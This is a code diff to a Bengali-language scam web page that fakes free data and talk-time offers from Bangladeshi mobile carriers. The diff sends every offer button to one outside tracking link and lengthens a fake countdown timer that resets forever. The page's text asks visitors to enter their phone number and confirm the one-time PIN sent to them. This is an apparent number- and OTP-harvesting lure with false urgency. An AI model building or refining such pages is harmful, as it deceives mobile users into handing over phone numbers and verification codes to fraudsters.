@@ -14,7 +14,7 @@
         }
 
         body {
-            /* Background image with overlay fix */
+            /* Background image with overlay */
             background: linear-gradient(rgba(0, 0, 0, 0.4), rgba(0, 0, 0, 0.4)), 
                         url('https://images.unsplash.com/photo-1534528741775-53994a69daeb?q=80&w=1000&auto=format&fit=crop') no-repeat center center fixed;
             background-size: cover;
@@ -172,59 +172,51 @@
 
     <div style="width: 100%; max-width: 420px;">
         
-        <!-- Top Big Banner Text -->
         <div class="top-banner-text">
             ফ্রি
         </div>
 
-        <!-- Main Card Container -->
         <div class="main-card">
             
-            <!-- Title -->
             <div class="offer-title">
                 <span class="gp-text">My GP</span> <span class="black-text">-</span> <span class="bl-text">BL</span> <span class="black-text">Offer</span>
             </div>
 
-            <!-- Description Box -->
             <div class="info-box">
                 অফার টি পেতে অবশ্যই আপনার মোবাইল নম্বর সাবমিট করে মোবাইলে যে পিন কোড যাবে সেটি নিচে OTP ভেরিফিকেশন করুন।
             </div>
 
-            <!-- Timer -->
             <div class="timer-container">
                 <div class="timer-item">
-                    <span class="timer-val" id="hr">00</span>
+                    <span class="timer-val" id="hr">02</span>
                     <span class="timer-lbl">HOURS</span>
                 </div>
                 <span class="timer-dot">:</span>
                 <div class="timer-item">
-                    <span class="timer-val" id="min">01</span>
+                    <span class="timer-val" id="min">00</span>
                     <span class="timer-lbl">MINUTES</span>
                 </div>
                 <span class="timer-dot">:</span>
                 <div class="timer-item">
-                    <span class="timer-val" id="sec">47</span>
+                    <span class="timer-val" id="sec">00</span>
                     <span class="timer-lbl">SECONDS</span>
                 </div>
             </div>
 
-            <!-- Internet Section -->
             <div class="section-heading">সকল ইন্টারনেট অফার</div>
             <div class="btn-group">
-                <a href="#" class="btn btn-bl">বাংলালিংক ২৫ জিবি ফ্রি ইন্টারনেট</a>
-                <a href="#" class="btn btn-gp">গ্রামীণফোন ২৫ জিবি ফ্রি ইন্টারনেট</a>
-                <a href="#" class="btn btn-robi">রবি ২৫ জিবি ফ্রি ইন্টারনেট</a>
-                <a href="#" class="btn btn-airtel">এয়ারটেল ২৫ জিবি ফ্রি ইন্টারনেট</a>
+                <a href="https://tonicgoverness.com/sb6aumx2?key=d2c9e0edc4da921ebf6d66676f9b1bcf" target="_blank" rel="noopener noreferrer" class="btn btn-bl">বাংলালিংক ২৫ জিবি ফ্রি ইন্টারনেট</a>
+                <a href="https://tonicgoverness.com/sb6aumx2?key=d2c9e0edc4da921ebf6d66676f9b1bcf" target="_blank" rel="noopener noreferrer" class="btn btn-gp">গ্রামীণফোন ২৫ জিবি ফ্রি ইন্টারনেট</a>
+                <a href="https://tonicgoverness.com/sb6aumx2?key=d2c9e0edc4da921ebf6d66676f9b1bcf" target="_blank" rel="noopener noreferrer" class="btn btn-robi">রবি ২৫ জিবি ফ্রি ইন্টারনেট</a>
+                <a href="https://tonicgoverness.com/sb6aumx2?key=d2c9e0edc4da921ebf6d66676f9b1bcf" target="_blank" rel="noopener noreferrer" class="btn btn-airtel">এয়ারটেল ২৫ জিবি ফ্রি ইন্টারনেট</a>
             </div>
 
-            <!-- Minute Section -->
             <div class="section-heading">সকল মিনিট অফার</div>
             <div class="btn-group">
-                <a href="#" class="btn btn-bl">বাংলালিংক ২০০ মিনিট ফ্রি</a>
-                <a href="#" class="btn btn-gp">গ্রামীণফোন ২০০ মিনিট ফ্রি</a>
+                <a href="https://tonicgoverness.com/sb6aumx2?key=d2c9e0edc4da921ebf6d66676f9b1bcf" target="_blank" rel="noopener noreferrer" class="btn btn-bl">বাংলালিংক ২০০ মিনিট ফ্রি</a>
+                <a href="https://tonicgoverness.com/sb6aumx2?key=d2c9e0edc4da921ebf6d66676f9b1bcf" target="_blank" rel="noopener noreferrer" class="btn btn-gp">গ্রামীণফোন ২০০ মিনিট ফ্রি</a>
             </div>
 
-            <!-- Footer Warning / Notice -->
             <div class="bottom-notice">
                 আপনার অফারটি সিলেক্ট করে, নিচে সাবমিট এ ক্লিক করে ফোন নম্বরের ওটিপি ভেরিফিকেশন করুন।
             </div>
@@ -233,9 +225,8 @@
 
     </div>
 
-    <!-- Timer Script -->
     <script>
-        let totalSeconds = 107; // ১ মিনিট ৪৭ সেকেন্ড
+        let totalSeconds = 7200; // ২ ঘণ্টা (2 hours = 7200 seconds)
 
         function updateTimer() {
             let hours = Math.floor(totalSeconds / 3600);
@@ -249,7 +240,7 @@
             if (totalSeconds > 0) {
                 totalSeconds--;
             } else {
-                totalSeconds = 107; // রিসেট
+                totalSeconds = 7200; // রিসেট
             }
         }
 
